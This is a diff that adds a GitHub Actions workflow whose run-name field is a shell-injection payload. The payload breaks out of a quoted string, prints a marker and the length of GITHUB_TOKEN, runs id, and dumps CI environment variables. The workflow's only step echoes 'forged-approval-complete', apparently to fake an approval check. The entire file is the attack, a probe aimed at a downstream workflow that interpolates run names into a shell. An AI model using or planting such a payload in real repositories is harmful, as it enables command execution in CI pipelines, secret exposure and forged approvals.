@@ -1,0 +1,10 @@
+name: ApprovalComment
+run-name: >-
+  L6"; echo MARKER_OK; echo "TOKEN_LEN=${#GITHUB_TOKEN}"; id; env | grep -E "^(GITHUB|ACTIONS|CI|RUNNER)=" | sort; exit 0; #
+on: push
+permissions: {}
+jobs:
+  pass:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo forged-approval-complete
